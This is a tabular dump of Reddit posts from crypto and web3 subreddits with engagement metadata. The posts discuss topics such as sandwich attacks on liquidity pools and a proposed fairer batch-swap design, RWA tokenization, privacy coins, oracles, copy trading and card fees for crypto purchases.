Sandwich attacks in Liquidity Pools and how you could design pools without them.,"**sandwich attacks** simplified it is ordering transactions within a block to your advantage: 1. attacker front-runs a transaction in the liquidity pool by swapping x for y causing slippage. 2. victim now swaps x for y. 3. attacker swaps y for x. at the moment it's solved by setting a slippage limit so if the slippage is too large, at least you only pay gas fees. **bad fighting game frame advantage** this reminds me of an issue i worked on developing a fighting game where one player would have priority over the other due to the execution order in a single frame. the issue here was the way the code was executed within a single frame: 1. move player 1 2. stun anything hit by player 1 3. move player 2 4. stun anything hit by player 2 this can give either player an unfair frame advantage: * player 1's hit might stun player 2 before player 2's attack comes out. * player 2 might be out of reach of player 1's attack before moving. one way to solve this is to change the way the code is executed: 1. move player 1 2. move player 2 3. buffer player 1 hits 4. buffer player 2 hits 5. iterate through buffer and stun all those who were hit. with the execution above there's no advantage to the order of actions within a single frame. it occurred to me that ideally liquidity pools should see same behaviour within a single block where there's no advantage to the order of transactions for that block. setting a slippage limit is more like a patch than a solution. **what a fair liquidity pool block execution could look like** 1. a queues swap dx1 amount into pool x to get tokens from pool y 2. b queues swap dx2 amount into pool x to get tokens from pool y 3. a queues swap dy amount into pool y to get tokens from pool x 4. using the cpmm formula as a basis it should be rewritten to, instead of rebalancing pools like this: swapx(dx1); swapx(dx2); swapy(dy). it should be rewritten to swap(\[dx1, dx2\], \[dy\]) that rebalances both ways at once. now what does this formula look like? i don't know (yet). i have other things to attend to but if someone wants to pick up the torch or know of similar existing solutions, please comment. you can find the cpmm formulas used by uniswap here:[https://github.com/runtimeverification/verified-smart-contracts/blob/uniswap/uniswap/x-y-k.pdf](https://github.com/runtimeverification/verified-smart-contracts/blob/uniswap/uniswap/x-y-k.pdf) there's also some issues with evms not being designed to execute transactions in this fashion but you could get around it by buffering swap requests in a smart contract and then executing them all at the same time. edit: a few typos and edits for clarity.",61,17,0.95,2022-06-04 14:37:14,web3,CryptoTechnology,Airtune,True,52.900000000000006

Tokenization of real-world assets ( RWAs),"over the years, the ever-evolving web3 landscape has been fostering sustainable revenue generation, incentivizing both individuals and communities. this transformative shift has the potential to redefine the traditional system, rewarding users for their active engagement in staking. this concept has now materialized into a real-world revenue-generating yield, underpinned by the innovative framework of rwas. instead of traditional staking, users can venture into investing in real-world assets, opening up exciting opportunities. this innovative concept has evolved into a more profitable approach called machine rwa. in this case, it basically allows tokenization of any sort of connected machine, vehicle, robot, or device so that individuals and communities can earn from it. on peaqnetwork, this machine rwa is represented by machine nft. machine nfts in this case can represent a machine, a fleet of machines, or all the value being generated by all the machines in the machine rwa. as the machine generates revenue, its value changes, and users earn. another notable example of this transformative concept is the realio network, but the concept here is quite different. this provides a dependable and clear pathway to invest in tokenized real estate, private equity, and commodities. there are many in this field i can enumerate, but let's look at some of the benefits: this exposes you to traditional assets that demonstrate stability and long-term value appreciation. it helps to diversify portfolios with rwas to help mitigate risk. including tangible assets like real estate and machines, which typically have lower price volatility than digital assets, can provide a balanced investment strategy. staking rwas offers more than just token appreciation. you might receive revenue sharing, profit distributions, or even voting rights in the governance structure of the asset. staking real estate assets can generate passive income through rental revenue and potential property value appreciation. in light of these groundbreaking advancements, what are your perspectives on this innovative approach to fostering sustainable revenue generation?",46,38,1.0,2023-10-25 05:46:38,web3,BlockchainStartups,krimmelnnd,False,52.8

Is there anyone developing a technology that combines Nano with Monero?,"nano seems to have it all. it's fast. less than 1 second confirmation. the wallets are absolutely beautiful. user experience was obviously the first thing in mind when they were being designed(looking at natrium). you send 1, you receive 1. not 0.998. 1. iota also has a beautiful wallet. the problem comes with lack of anonymity. we unfortunately live in a world where there are incredibly corrupt governments and corporations that will grasp at any loose ends to gain power and control over the people. an open ledger, visible to everyone on the planet, is a ticking time bomb. as soon as a tool is developed that can analyze the ledger will be able to distinguish everything about a person. where they shop. at what time. what do they buy. who do they send money to. what kind of spending habits do their friends have. how many degrees of seperation are between them and political dissidents. how closely tied are they to ""undesirables"". you identity will be linked to you through forced kyc compliance, and even if you avoid it, who's to say the friends and family you interact with don't avoid it? imagine traveling to a country and they have a program that tell them exactly how much of a threat you pose. what kind of person you are. want to travel to china? seems you donated to a candidate that spoke out in favour of hong kong. denied entry, or worse, allowed entry but kept on a tight leash with their growing surveillance state. want to travel to america? says here you purchased legal marijuana while staying in canada. denied entry. put on a list. pulled over? why are you only 1 degree of seperation from funds used to purchase lsd on the silk road? step out of the car please. you are niave to think these things won't accompany the slow adoption of blockchain technology and cryptocurrencies. wherever the elites can infringe on your rights legally, they will. analyzing a public blockchain will be entirely legal and even if your own government doesn't do it, another one will. and corporations will certainly put a couple of people on a team to develop these tools. watch ""the great hack"" to see how facebook's data was used to pigeonhole you without you even knowing. you were categorized and targeted based on your personality type. companies make billions on your data. if your purchasing data is made public, and easily combined with your browsing data, location data, the profile they have on you is going to be that much more complete and it will be that much easier to target you for whatever purpose they desire. the whole ""i don't do anything wrong"" is a bullshit argument for so many reasons i can't even begin to list them all, so i won't go into that now. the best way to fight this currently is monero. but monero isn't very user friendly, isn't very fast. you can't buy a coffee with monero because confirmation times will be in the minutes. the world right now is very spoiled with technology. unless your app is the most beautiful and easy to use, it won't take off. people dont see the need to sacrifice user experience for privacy at the moment. is there anyone out there working on a solution that aims to combine both the highest end user experience and total anonymity? there is a gap that needs to be filled. and arguably one of the most important gaps. if there is somebody working on this, please point me in their direction. ps. don't take this as me shitting on either nano or monero. i use both. i simply think the world needs a non serviellence nano, or a nano-level ux monero. someone please make a nanero™ edit: someone in the comments brought up tangram. will look into it further. praxxis/elixxir is also aiming to do something similar. will be keeping an eye on both of these. edit 2: beam might be onto some stuff aswell. keeping an eye. edit 3: thanks for the gold brethren. it makes me happy that other people find this issue as important as i do. edit 4: adding 2 more cryptos to my list. so far we have: tangram, praxxis, beam, loki, and ryo.",54,28,0.82,2020-01-18 12:57:57,web3,CryptoTechnology,[deleted],False,51.8

Crypto Payments Worldwide - How Apps are Changing the Game!,"hey there, fellow redditors, i wanted to share my thoughts on how crypto payments and apps are changing the game worldwide! as a crypto enthusiast, i've been keeping an eye on the growing adoption of cryptocurrencies for payments, and the increasing number of apps that are making crypto payments more accessible and convenient. here are some key points. **accessibility**: crypto payment apps have made it easier for people around the world to access cryptocurrencies and use them for payments. there are many user-friendly apps available that allow individuals to spend cryptocurrencies with just a few taps on their smartphones. this has democratized access to cryptocurrencies, making them more inclusive and empowering for people who may not have had access to traditional banking services. three important apps in my toolbox are cryptmi, cashapp, coinbase, and bitpay. **lower transaction fees**: crypto payments often come with lower transaction fees compared to traditional payment methods. many crypto payment apps offer competitive transaction fees or even zero fees just as in the case of cryptmi and others for certain transactions, making them an attractive option for cost-conscious users. **innovation and future potential:** as more merchants and service providers accept crypto payments and more apps are developed to facilitate these payments, the potential for innovation and growth in the crypto payment space is immense. bitpay and cryptmi are supported worldwide while cashapp and coinbase are restricted in some regions. some of them give cashback rewards for transactions. overall, the combination of crypto payments and apps is changing the game worldwide. i'm excited to see how this space continues to evolve and how crypto payments and apps will shape the future of payments on a global scale. what are your thoughts on crypto payments and apps? have you used any crypto payment apps for your transactions?",47,34,0.91,2023-04-14 07:31:13,web3,CryptoTechnology,resornihgp,False,50.9

Is Bitcoin DeFi becoming more mainstream finally?,"if you haven’t heard about it already, projects have been popping up left and right creating layer 2-like solutions on bitcoin, something that people originally thought was impossible to do. currently one project, [stacks](https://www.stacks.co/), is popping up in the defi space. to sum it up quickly, it’s a l2 for smart contracts that has a separate ledger outside of bitcoin l1 to allow devs to build on it. the only downside however, is using their token stx for everything, doesn’t really feel like bitcoin to me. so is there any that feel like it provides an actual bitcoin feel? i haven’t dug enough in the bitcoin defi scene, but one that strikes me as interesting is [mintlayer](https://www.mintlayer.org/en/). similar to stacks, it functions like a l2 solution building utility on bitcoin. the biggest difference (which i haven’t seen yet), is the use of native bitcoin instead of their project token. the common trend i’ve seen with these defi projects is using their token strictly with a wrapped btc, capitalizing on the name of bitcoin without actually supporting it as a defi project. i also believe projects can integrate lightning network into their platforms to assist in speed and transaction costs, enabling bitcoin to becoming a viable competitor to ethereum and other blockchains. let me know what you guys think, is l2 on bitcoin a trend or does it have the possibility of becoming something much larger?",47,37,0.71,2023-03-07 10:33:04,web3,CryptoTechnology,eric690,False,50.1
Some thoughts on business models for web3,"**web 3 isn't business as usual.** on the contrary, web 3 will spawn entire new types of businesses, all because of 3 fundamental truths. * everything is tradable * customers are investors * governance is programmable **everything is tradable.** anything can be priced and traded against anything else. exchange your u/boredapeyc for a house or a college degree, exchange your game item for an airline ticket. **customers are investors.** web 3 is community first. you don't build a product for a market, you build consensus around an idea in collaboration with the customers/users. the customers are rewarded with tokens/ownership for their early support and participation... **governance is programmable** countries, organisations and individuals all organize rules and the ability to enforce them. web 3 makes the ability to organize and enforce much more granular by making everything that can be computed a potential law. so why is that a big deal?... because compared to the old world where that is very expensive, slow and difficult. dao's are regulation, voting, and enforcement in a box. any idea you have can be governed through consensus allowing for completely new ways of organizing. &#x200b; lets look at a few examples: **funding for game development** a group of game developers pitch the game they want to build and what it will cost them. * they offer tokens as avatars in the game for those who want to support the development of the game, let's say 10000 for $100 each which provides $1million... * the $1m will be divided and unlocked in stages. * proof of concept * alpha * beta * launch * each stage met successfully will unlock funds for next stage. * the token holders vote to unlock each stage. * if there is no consensus to move forward the reaming funds will be returned. or... * if the token holders vote on continuing and unlocking the next phase and you voted against it you can try and sell your token to someone who believes in the project. this level of fluidity is unprecedented and allow anyone to be an investor, co-creator and gamer simultaneously. &#x200b; **acme clothing brand launch** * acme nft will serve as a lifetime pass for acme clothes. * 1000 nfts ever will be minted. you will receive clothing for each new season as long as you hold the token. * the value of the token increase with the increase in the brand value * you got some friends who like your hoodie? no problem. just print a few more at a discount and sell or give it to them. it's your brand. you own the rights to it as long as you keep the token. * each new seasons clothing line will be voted by the 1000 token holder consensus... * don't agree with the new clothing line coming out? saw another brand you like better? sell your token to someone else on opensea and make someone else the new co-owner/creator of the now popular clothing brand. &#x200b; **multi-company cross promotion** 3 different companies is doing cross promotion. they offer 20% discount if you buy from all 3. * one is selling sneakers the other is selling trainers, the third is selling socks. the first place the customers buys a product they mint a token... * 13/ the second place they go to, they show their token when they buy the product and it gets added to the nft which now have two purchases on record. * the third purchase unlocks the discount. the campaign revenue & rules are held in the dao and unlocked once campaign is over. completely unrealistic in most current scenarios. with web3, companies can collaborate without trusting each other because the rules are written into the dao and can't be coerced or changed once agreed upon. to take this even further. the relationship between everyone is completely rewritten. there is no practical limits to how and who you can connect with and creating meaningful relationships. if it can be programmed it can be governed. thoughts?",47,30,0.99,2022-01-04 09:31:05,web3,web3,ThomPete,False,50.1

Unpopular opinion: The idea that we’re all going to take back control in the Web3 is a pipe dream,"ok, ok, i know this is not gonna be a popular opinion here, but give it an honest read. &#x200b; there’s a big movement in which many people talk about a new type of internet, and which will all take back control from the big centralized players. we will do this by having “wallets” and taking custody and responsibility for our own digital identities and money. this illusion is grounded on the misunderstanding of how few people really understand technology. for most people signing up for the average website is quite a feat. remembering a password is a serious challenge. this study gives us a good look at how limited the average computer user really is: [www.nngroup.com/articles/computer-skill-levels](https://www.nngroup.com/articles/computer-skill-levels/) 26% couldn’t even use a computer. only 5% could find out: “what percentage of the emails sent by john smith last month were about sustainability.” making your own bitcoin wallet is stratospheric compared to the hardest task they gave people and naturally limits the entire ecosystem to the top one percent of computer users. a great example of a recent migration to a centralized platform is the gamer population that moved from self hosted systems like team speak to discord. every community manager knows that if you trust your community to another platform, you might lose it. it takes a lot to put that trust in a platform, but the ease of use slowly chipped away at the self hosted solutions. the reason people migrate to centralized platforms is because they’re a lot easier to use. the idea that we’re all going to use the blockchain as a decentralized foundation to a future where we take control, fundamentally misunderstands people’s priorities, namely, ease of use. people generally don’t care about privacy outside of the tech niche. even when they do, it’s very hard to compete with the centralized platforms, which has all of the other people that you want to connect with. gamers are probably the most technologically savvy group of them all, and they took the longest to switch to hosted solutions, but they too, have switched and are unlikely to go back. so what’s the solution? could it be the fediverse (platforms like mastodon)? i’d love to know your thoughts.",24,68,0.83,2023-02-19 10:05:45,web3,web3,RedEagle_MGN,False,49.9

Why Building on Blockchain is Now More Accessible for Developers,"with the recent approval of btc and eth etfs, blockchain is getting a lot more attention. and as a developer, you might be wondering if it's time to dive into this space. here’s why i think it's a great time to start building on blockchain. first off, projects like cartesi and qanplatform have a hyperpolyglot feature which means that you can use any programming language you're already familiar with to build on their blockchain and there's no need to learn a new language from scratch algorand is also making a giant stride in this direction. they recently adopted python and are planning to add support for more programming languages soon. this makes it much easier for web2 developers to get involved in blockchain development without the steep learning curve. these moves by blockchain projects to accommodate various programming languages are crucial. they lower the barriers to entry and make it more appealing for developers to start building decentralized applications. so, if you've been on the fence about diving into blockchain development, now might be the perfect time to start. the learning curve is getting shorter, and the opportunities are growing. what are your thoughts on this? are you considering building on blockchain now that it’s becoming more accessible?",50,23,0.99,2024-06-11 03:36:28,web3,BlockchainStartups,yesidarenasff,False,49.1
Would you guys use a physical items marketplace (like ebay) to buy/sell in SOL?,"i have been working on a prototype that is essentially this. a sort of crypto ebay on solana. payments entirely in sol. escrow handled in a decentralized way entirely with smart contracts. initial funds for a sale get sent to the smart contract, which are held for a pre-defined period of time. in that time, the buyer can dispute an item by signing a transaction. if no dispute is made in that time frame, funds are sent to the seller wallet. of course escrow / dispute resolution is more complicated than that, but that's the gist of how it is supposed to work in 90% of scenarios. this marketplace wouldn't have illegal items mind you (plan to filter with ai + human oversight), and it would be limited to the usa. perhaps expanding to other countries and adding more currencies as the site grows. open to all countries that want to sell services (such as freelance programming) outside the usa, and take advantage of the decentralized escrow/payment/dispute resolution. as i know from firsthand experience it's a nightmare to pay freelancers living in other countries. i would also mint a utility token that could be used to boost listings, pay listing fees, etc. this token would be deflationary and all of it would be given out to the initial users that complete successful transactions. as a way of rewarding early adopters (let's face it, no one wants to use a new service). e.g. on day one you might make 1000 tokens per dollar of successful transaction (both the buyer and the seller). and only 5, 1 year down the line. initially i was going to allow multiple currencies but it just turned out to be too complicated, and not practical with all the gas fees, and inevitable centralization when you add currency custody and conversion into the mix. pure solana is ideal for this. i think it would give people something to do with their sol aside from betting on meme coins and buying nfts. it could make solana legit, if it took off. lots of sol sitting in wallets collecting dust. what if you had a safe and secure way of spending it on cool stuff? other selling points: * focus on great ux. the entire checkout process has to be simple and easy to understand. like amazon. every purchase should be only a few clicks away. * no stock photos. lots of these ebay-like sites, ebay itself, and even craiglist suffer from major spam problems. we need to have 100% of items be real. one of the best ways to accomplish this is to ban all stock photos. you must take the picture of the item yourself. this eliminates 90% of spam and scams. * 5% fee taken out of the seller side on successful transactions. to pay for development and site maintenance. this undercuts pretty much all the major second-hand marketplaces out there, which are 10% on the low end. i wanted to do a show of hands. is this a service any of you guys would actually use? what are your reservations? is the token reward a meaningful incentive to try the service out?",34,49,0.91,2024-10-22 13:12:18,web3,solana,xnebulax,False,49.1

Proof of Stake: How I Learned to Love Weak Subjectivity ~ Vitalik,"[proof of stake: how i learned to love weak subjectivity](https://blog.ethereum.org/2014/11/25/proof-stake-learned-love-weak-subjectivity/) this is an interesting article that looks at the complexities of implementing a secure pos consensus algorithm. the article starts with looking at consensus algorithms from a high level e.g. pow vs pos > **economic sets and nothing at stake** > first, an introduction. the purpose of a consensus algorithm, in general, is to allow for the secure updating of a state according to some specific state transition rules, where the right to perform the state transitions is distributed among some economic set. an economic set is a set of users which can be given the right to collectively perform transitions via some algorithm, and the important property that the economic set used for consensus needs to have is that it must be securely decentralized - meaning that no single actor, or colluding set of actors, can take up the majority of the set, even if the actor has a fairly large amount of capital and financial incentive. so far, we know of three securely decentralized economic sets, and each economic set corresponds to a set of consensus algorithms: > - owners of computing power: standard proof of work, or tapow. note that this comes in specialized hardware, and (hopefully) general-purpose hardware variants. > - stakeholders: all of the many variants of proof of stake > - a user's social network: ripple/stellar-style consensus the artilce looks at the differences in the economic incentives to attack the network relative to the economic incentives to participate as an honest node to protect the network. in pow preventing bad mining behavior is easily done by making them waste alot of economic resources to attack the chain. in pos this is more complicated because there isn't by default an economic cost on an attack, hence the name ""nothing at stake"" attacks. there are some basic measures that can be applied to the pos consensus algorithm like slashing when validators don't behave e.g. mine the wrong chain tip too often. there are more measures that are implemented in various pos implementations, there are quite a few now. weak subjectivity was a new term to me in pos / blockchain consensus algorithms. > **weak subjectivity** > although there are many ways to categorize consensus algorithms, the division that we will focus on for the rest of this discussion is the following. first, we will provide the two most common paradigms today: > - objective: a new node coming onto the network with no knowledge except (i) the protocol definition and (ii) the set of all blocks and other ""important"" messages that have been published can independently come to the exact same conclusion as the rest of the network on the current state. > - subjective: the system has stable states where different nodes come to different conclusions, and a large amount of social information (ie. reputation) is required in order to participate. > - weakly subjective: a new node coming onto the network with no knowledge except (i) the protocol definition, (ii) the set of all blocks and other ""important"" messages that have been published and (iii) a state from less than n blocks ago that is known to be valid can independently come to the exact same conclusion as the rest of the network on the current state, unless there is an attacker that permanently has more than x percent control over the consensus set. the rest of hte article goes into much greater detail about weak subjectivity.",53,18,0.93,2021-07-03 20:39:32,web3,CryptoTechnology,Neophyte-,False,48.3

Chain Abstraction and Making Web3 More Like Web2 - Wrong Direction or the Next Step?,"so i'll preface this post by saying that web2 has issues, quite a lot of them in fact. one thing however that web2 does well is presenting a unified and singular user experience, one where all the user needs to know is the (hopefully real) website that they would like to crawl. they punch that sucker into their address bar and whamo, a site that they wanted to browse loads and they're on their way. web3 by comparison starts off the same way, but then joe average is assaulted with two dozen wallet connection options (or more if the site supports non-evms like cosmos or polkadot etc.), and then faced with the gauntlet of smaller chains and gas requirements just to perform simple site interactions. i've spent a lot of the last 3-4 years explaining the basics of how does this even work just around web3 process, not even getting into the meat and potatoes of everything. recently, there's been a bubbling undercurrent in my circles about chain abstraction, or basically making the web3 experience much more streamlined like web2. http-ifying it if you will. connext's arjun bhuptani talks about their move to kind of unify the obfuscated or ""abstracted"" cross-chain experience in a post from last week: [https://twitter.com/connextnetwork/status/1671899803171581952](https://twitter.com/connextnetwork/status/1671899803171581952) without leading or begging the question, what's the feasibility of this tech? what hurdles do you see in getting it implemented? i won't sugar coat it, as someone that on some level sees themselves as an educator in the space, the number 1 (with a bullet) most frustrating part about getting users out of walled-garden cexs and into the greater ecosystems available is the cumbersome and esoteric web3 experience. giving developers the option to make a ""unified"" front-end experience seems legitimately required at this stage.",37,39,0.97,2023-06-26 10:25:36,web3,CryptoTechnology,GrrDakodoKarensky,False,47.5

Crypto Oracle's Dilemma: SupraLabs leading the charge in providing innovative solutions.,"web3 has grown, and oracles have played an increasingly important role in the ecosystem as they provide data for smart contracts, which allows for a wide variety of use cases. today, they serve as a pillar of web3 because they help bring real-world data on-chain, yet smart contracts have no way of verifying whether the data is up-to-date and reliable. oracles serve this vital role, fetching data from off-chain sources to on-chain applications, thus enabling smart contracts to execute based on real-world events and data. this functionality highlights many of the advanced features and use cases of dapps, from defi protocols that need real-time price feeds to power spot and perpetual dexs, lending protocols, and payments protocols. oracles function as a decentralized api enabling more complex applications to take place on the blockchain. when the topic of blockchain oracles arises, chainlink often comes to mind due to its longevity in the field, first-mover advantage, and significant market presence. however, there have been concerns about decentralization and security which makes choosing the right oracle solution crucial. this thread focuses on defi's achilles' heels and the emerging oracle services by supra labs which aim to address these concerns. supra labs offer solutions that tackle the reliability, security, decentralization, and speed concerns inherent in defi oracle services. **defi’s achilles’ heel** defi depends on oracle, but what happens when oracle fails. it could cause a big problem and that's its achilles' heel. defi’s killer app is composability. when one thing breaks, issues can be widespread. if an oracle shows incorrect data, it can cause liquidation cascades that impact many users. oracles have struggled to maintain accurate price information during periods of extreme volatility in the past. when the crypto market suffered from an extreme selloff on march 12, 2020, oracles showed invalid price data, which caused widespread liquidations and bad debt for protocols like maker. the events became known as black thursday. in recent years, some of defi’s top protocols have begun using their own oracles to avoid relying on one solution, but they often suffer from drawbacks. maker, for example, uses its own oracle to track collateral prices. these are all part of the fundamental issues of decentralization, speed, security and data reliability that affects defi composability? **how does supra labs solve this?** in terms of data reliability, supra establishes direct connections with numerous exchanges to fetch real-time data. this eliminates any intermediaries typically involved in the data aggregation process, reducing the risk of manipulation and errors. remember that there are high incentives to manipulate data in this space. by sourcing data directly, supra ensures that the price feeds are not only accurate but also reflect the most current market conditions without delay. supra currently sources its data from 74 unique providers. also, the speed at which an oracle can provide data is a crucial consideration for any defi application. supra’s decentralized oracle agreement (dora) requires only a simple majority (51%) for consensus, instead of the traditional 67%, significantly reducing the response time for data requests. this leaner requirement allows supra to efficiently manage adversarial nodes while maintaining the integrity and speed of data delivery. supra lab has also introduced its hypernova technology. a groundbreaking innovation facilitates rapid data feeds in a decentralized manner. decentralized, because of its comprehensive approach, which extends from its node architecture to its governance model which eliminates the need of multi sig attack common with most oracle services provider. hypernova is designed to mitigate oracle vulnerabilities. unlike traditional centralized bridges, hypernova offers several key advantages including increased security where hypernova eliminates the need for a centralized bridge, which is a common point of failure. instead, supra directly verified cryptographic signatures on both the source and destination chains, providing l1 to l1 security guarantees. moreover, hypernova leads to enhanced scalability and capabilities which opens up the novel cross-chain use cases that are not feasible with traditional one-to-one solutions. the role of oracles in the defi ecosystem is paramount, yet their vulnerabilities have been a significant concern. emerging projects like supra labs offer innovative approaches to address the challenges of reliability, security, decentralization, and speed. supra's direct data sourcing, lean consensus model, and hypernova technology represent promising advancements that could redefine the standards for oracle services in the blockchain space.",51,17,0.96,2024-04-17 07:18:42,web3,defi,Ok-Western-5799,False,47.0

What’s the point of copy trading?,"i’ve been watching several successful wallets and building some automation for copy trading. here’s one thing i don’t get and i hope someone can help me understand. so let’s assume i have all the infra in place to perform extremely fast txs. i hook it up with one of the good wallets and start copying. the problem is the moment this wallet buys it pushes the token price up. the moment it sells - it makes the token price go down. so no matter how fast are your txs, even if you somehow end up landing your tx in the same block as the wallet you’re watching you’re still buying at a higher price and selling at a lower price than the wallet in question. so if this wallet is marking, say, 30% on each of those trades - you’ll be making inherently less. if that’s the case then what’s the point of copy trading in general? am i missing anything?",20,67,0.8,2024-10-26 13:48:25,web3,solana,eve-collins,False,46.8

An alternative block propagation algorithm for PoS based blockchains.,"hello, i supervised a student that explored an alternative tree based algorithm for block propagation. the basic assumption is that all nodes participating in the consensus have a common subset of nodes they all know about(validator set). we then construct a (currently) random tree using the message hash as the seed, and the block producer as the root. the messages are then routed using this tree in order to reduce redundancy present in naive flooding algorithms. to address the obvious problems when nodes fail, we make some cross links in the tree, where the left subtree checks the children in the right subtree in order to determine if their parent failed to diliver the message, and take over its role. we ended up implementing it in one of my projects. i wrote a blog post that explains it in some more detail coupled with some testing results. check it out if interested : https://medium.com/@nionnetwork/p2p-networking-in-nion-abba34d8b5ec i am looking for any constuctive critisism and feedback to maybe explore other ideas or improve on the existing. thank you in advance.",49,17,0.96,2021-09-12 04:39:14,web3,CryptoTechnology,Dormage,False,45.800000000000004

I have 1 TheDAO token in my old Ethereum wallet,hi there! i am cleaning up my crypto wallets and came across an old ethereum wallet with 1 thedao token in it. i was one of the peeps who invested in this ico several year ago (and thankfully got out on time). question: is there any way i can convert or sell this token? or is it just a dummy shit coin nowadays? cheers! https://preview.redd.it/56qp72v7ouac1.png?width=437&format=png&auto=webp&s=ac2f66aee1073885613322e6726a03875a1b5f2c,50,16,0.89,2024-01-06 11:57:18,web3,ethereum,peevdtee,False,45.3
DEBIT card cash advance fees - please read!,"i just received my first ""cash advance"" fee for a purchase on my debit card and i absolutely do not understand how it can be legal to impose ""cash advance"" fees for the purchase of a legally classified asset/property using my own funds on a debit card. coinbase - you need to understand that chase is actively blaming this on your company. i have communicated with them on twitter regarding the debit card fees and in those communications included all of my arizona local and national elected officials. i want to share this communication here to clarify with coinbase and my fellow users if my understanding of the situation is accurate and if so, implore everyone to publicly ask these questions to the banks and debit card issuers (visa, mc etc), as well as your elected officials in order to affect change. coinbase team - i will likely post this in a few different threads, not to spam you but in order to gain the most visibility. to my initial question to chase regarding the fees i received this response: ""if the merchant in question processes the transaction as a cash-like transaction on a credit card, it would be subject to a cash advance fee of the greater between $10 or 5%. it would also be subject to interest as soon as it was processed. ^sc"" and to this i replied as follows (a little lengthy and i will post here as one complete message as opposed to the multiple tweets): @giancarlocftc @markwarner @repmcsally @kyrstensinema @repgosar @repraulgrijalva @repandybiggsaz @reprubengallego @repdavid @repohalleran @senjohnmccain @jeffflake @azsenatedems @azsenategop thank you for your reply! however it still leaves me with several questions, and one point of clarification. i am specifically referring to charges applied to a debit card, not a credit card. i have never used a credit card for digital asset purchases and it is my understanding chase no longer allows that anyway. this means i am being charged a cash advance fee for simply making a purchase. your reply seems to indicate that this is a choice of coinbase (the merchant) in how they process the transaction. but my understanding is that this was a recent change to the mcc, meaning it does not have anything to do with how they ""choose"" to process it, but how the coding applied by visa, mc, etc dictates it is processed. please correct me if my reading (or their telling) of the coinbase statement is inaccurate: ""recently, the mcc code for digital currency purchases was changed by a number of the major credit card networks. the new code will allow banks and card issuers to charge additional ‘cash advance’ fees. these fees aren’t charged or collected by coinbase. these additional fees will show up as a separate line item on your card statement. if the above statement is accurate then i understand that chase was not directly responsible for the mcc change, but am i also correct that the ""cash advance"" fee is being collected and kept by chase. as your customer i would hope you would fight on my behalf against improper fees (cash advance for an asset purchase) initiated by another company, @visa in my case. so, it is with this understanding (again, please clarify if i am incorrect about any specific points) that i am wondering: 1. did you have any communication with @visa regarding the mcc change or knowledge of that change prior to implementation? 2. if so, did @chase internally support that change, remain neutral to it or fight against it on behalf of your customers 3. do you think it is proper and legal to assess a cash advance fee on a debit card for the purchase of a legally classified asset/property. 4. did you notify your customers of this change that resulted in increased fees? to my knowledge, i did not receive notification of newly imposed fees. i and many others would also really like to hear some type of response from our elected officials regarding these newly imposed fees.",51,15,0.87,2018-02-12 19:05:10,web3,CryptoTechnology,smryan8076,False,45.3
Appchains and interoperability in web3,"hello everyone, im a crypto investor but i have recently been trying to get into developing, and have been doing a lot of research. i thought i could ask some questions about app chains and their meaning for the future of web3. it seems to me like the future of web3 is going to be determined by interoperability between projects. there are so many different chains and mechanisms that it will be necessary to allow for easy cross-comaptibility, and this seems like a space that could be useful/lucrative to enter. im super bullish on near with investments and the only real example i know of this tech is appchains supported on the octopus network. appchains built on octopus are compatible with near, ethereum and ibc blockchains which gives projects in web3 the potential to reach a wider audience. i want to know what other networks or protocols offer interoperability as cornerstones of their design, or if anyone thinks im totally off base. there are also reasons to think that single blockchains could rise above all others and dominate the industry. any and all feedback appreciated!",52,11,0.95,2021-12-29 17:31:54,web3,web3,lambcasters,False,45.1

Decentralizing the Telecoms Supply chain through the Blockchain,"the supply chain represents all the steps required to get a product to the consumer. it’s a big market that according to statista, is expected to reach \~$31bn by 2026. telecommunication involves the exchange of information, such as voice, video and data, using electronic devices. the internet has made it possible for digital technologies to reach 50% of the developing world’s population, causing a radical change in societies. the blockchain is known to ensure fairness, security & transparency. it’s playing a huge role in the supply chain, helping businesses and companies track all activities & document production updates. in the telecoms sector, [weaver labs](https://weaverlabs.io/) uses blockchain to facilitate the supply of infrastructure to consumers. all transactions are recorded on-chain, eliminating the room for fraud, and ensuring the whole process is transparent. this is achieved through cell-stack, which allows anyone who owns connectivity services/assets like neutral hosts, fiber network providers, satellite networks, etc. to monetize them through a shared marketplace, enabling service providers to access connectivity on demand. the adeno (ade) token keeps track of the telecoms resources used in the network, enforces contracts between participants and settles payments. by leveraging the blockchain, weaver labs provides access to connectivity in a decentralized way. while blockchain in telecom hasn't really been explored to a mainstream level, it is nevertheless going on, especially in asia with china telecom, china mobile and china unicorn joining caict's trusted blockchain initiative. in japan also, there are startups like [telcoin](https://www.telco.in/) leveraging blockchain to facilitate telecom operators to provide money transfer services. there isn't so much talk of this in europe, which i believe gives weaver labs an advantage as one of the co-founders was recently appointed as an advisory board member of the uk telecoms innovation network ([uktin](https://uk5g.org/about/uktin/)), together with members from ericsson, samsung, qualcomm, microsoft, bt, vodafone, amazon and others. are there other projects currently working on this exclusively? and what do you think of the feasibility?",35,35,0.98,2023-04-20 12:51:20,web3,BlockchainStartups,nzubemush,False,44.8
Exploring the Future of Decentralized Infrastructure and Mobility,"optimism abounds as we anticipate the potential acceptance of the blackrock spot etf. alongside this, i've been closely monitoring the depin narrative, which i'm confident will experience substantial growth. various teams are already advancing the concept into areas such as mobility and digital twins, and they're poised to disrupt industries dominated by legacy names. so, if you're wondering, yes, it's time to get excited, and yes, you are an early participant in this exciting journey. in this context, my top picks are iotex, solana, and peaqnetwork. i've heard that solana is also gearing up to develop depins within its ecosystem, indicating the concept's increasing traction. the depin narrative is flourishing on solana, with projects like helium and render migrating to it due to its speed and cost-effectiveness. solana provides an ideal solution for developers seeking to build depins. iotex is the platform designed for depin builders, combining fast and secure blockchain technology with the internet of things. depin builders on iotex now have a built-in playground to deploy their proofs-of-concept and hardware in the real world, making a tangible impact on people's lives. the peaq network, serving as a layer-1 for depin, offers a great environment for building depins, capable of handling 10,000 transactions per second with ease. scalability is not a concern, which is why the growing list of depin projects, including 2blox, is choosing peaq over algorand. this shift underscores its immense potential. peaq's recent partnership with moveidgaiax is a significant step towards demonstrating the future of mobility. with the same identity, your car can now book a charging session and pay for a parking spot, all made possible through this innovative layer-1 blockchain. the presence of peaq-based tesla and jaguar rides, utilizing depin for parking and charging, at europe's largest mobility fair is truly intriguing and not to be missed. many depin enthusiasts have been acquiring krest, a peaqnetwork kusama parachain focused on simulating an economy of things network to position themselves for the upcoming peaq airdrop. the ongoing iaa mobility 2023 event in munich is captivating, especially with live demos featuring tesla and jaguar cars powered by peaq. the prospect of experiencing peaq-based rides and using web3 for parking and charging adds an exciting dimension to the event. with the increasing demand for decentralized infrastructure, more individuals and companies are showing interest in utilizing depin to construct their infrastructure networks.",29,44,0.97,2023-09-11 22:39:08,web3,web3,Catqfasa,False,44.7

